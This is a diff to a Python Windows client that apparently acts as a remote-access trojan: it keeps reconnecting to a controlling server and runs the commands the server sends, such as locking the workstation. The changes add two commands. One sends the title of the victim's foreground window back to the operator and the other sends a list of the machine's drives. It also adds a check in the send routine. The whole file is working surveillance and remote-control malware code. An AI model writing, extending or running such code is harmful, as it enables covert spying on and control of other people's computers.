@@ -3,7 +3,9 @@ import subprocess
 import os
 import sys
 import threading
+import win32gui
 import win32clipboard
+import string
 import win32api
 import ctypes
 from time import sleep
@@ -66,6 +68,12 @@ def main():
 
                 elif command == "lock":
                     lock()
+
+                elif command == "window":
+                    window()
+
+                elif command == "drives":
+                    drives()
 
             except socket.error as e:
                 del SERVER
@@ -186,6 +194,21 @@ def lock():
     send("Locking...")
     ctypes.windll.user32.LockWorkStation()
 
+# Sends current window
+def window():
+    send(win32gui.GetWindowText(win32gui.GetForegroundWindow()))
+
+# Sends all drives
+def drives():
+    drives = []
+    bit_mask = ctypes.windll.kernel32.GetLogicalDrives()
+    for letter in string.ascii_uppercase:
+        if bit_mask & 1:
+            drives.append(letter + ":")
+        bit_mask >>= 1
+    send(str(drives))
+
+
 def connect_to_server():
     while True:
         try:
@@ -203,6 +226,9 @@ def receive():
     return msg.decode()
 
 def send(msg):
+    if msg is None or msg == "" or msg == " ":
+        return
+
     msg_len = str(len(msg)).encode()
     msg_len += b' ' *(BUFF_SIZE - len(msg_len))
     SERVER.send(msg_len)
